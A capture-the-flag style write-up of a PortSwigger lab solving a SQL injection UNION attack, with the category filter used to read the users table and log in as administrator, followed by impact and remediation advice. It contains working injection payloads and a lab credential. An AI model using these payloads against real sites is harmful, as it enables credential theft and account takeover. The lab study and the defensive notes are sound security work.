# SQL Injection UNION Attack: Retrieving Data from Other Tables

- **Lab:** SQL injection UNION attack, retrieving data from other tables
- **Platform:** PortSwigger Web Security Academy
- **Category:** SQL Injection (OWASP A03:2021, Injection)
- **Difficulty:** Practitioner
- **URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

## Environment & Scope

Isolated training lab on PortSwigger's Web Security Academy. Each lab runs on a dedicated, disposable instance tied to my own account. No third-party or production systems were involved.

## Objective

The product category filter is injectable. The database holds a separate `users` table with `username` and `password` columns. The goal is to use a UNION attack to read those credentials and log in as `administrator`.

## How this differs from finding a text column

This lab continues directly from the previous one, so the mechanics look almost identical. The difference is the source of the data. Finding a text column used a value I supplied, for example `UNION SELECT 'a', NULL`, just to see which column renders a string. Here the same column carries real data read from a different table: `UNION SELECT username, password FROM users`. The new idea is `FROM users`. The injected SELECT no longer reads from the product table the application queries, it reaches into a separate table and returns its rows. Finding the column located the channel, this step sends real secrets through it.

## Reconnaissance

Same injection point as the other labs, the category GET parameter. This lab names the target table and columns (`users`, `username`, `password`), so the work is to match the column count and select from that table.

## Exploitation

### Step 1: column count

```
?category=Gifts' UNION SELECT NULL,NULL--
```

One NULL and three NULLs errored, two NULLs returned the page normally. The query returns 2 columns, and both can hold the retrieved strings.

### Step 2: read the users table

```
?category=Gifts' UNION SELECT username, password FROM users--
```

The response listed every user's username and password alongside the products, including:

```
administrator    svc4y3qcwlmazz8wnmnk
```

### Step 3: log in

Using that password I logged in as `administrator`. **Lab solved.** The value is from a disposable lab instance and is already dead.

## Impact

With a single request an unauthenticated visitor read the full credentials table and took over the admin account. The product listing query was the entry point, but the UNION reached a table that the listing never touches. Any readable table is exposed the same way: users, sessions, tokens, internal records.

## Remediation

- **Parameterised queries (prepared statements).** Bound input cannot add a UNION or a comment, which removes the injection at its root.
- **Store passwords as salted hashes, never in plaintext.** Even if the table is read, hashed passwords are far less useful than the plaintext exposed here.
- **Least privilege** for the application's database account, so the product-listing query cannot read the `users` table at all.

## Key takeaway

Finding a text column and retrieving data are two steps of one attack. The first locates a column that displays a string, the second puts real data from another table into it with `FROM <table>`. The jump from `SELECT 'a'` to `SELECT username, password FROM users` is the whole point of a UNION attack: turning a product filter into a read of any table in the database.
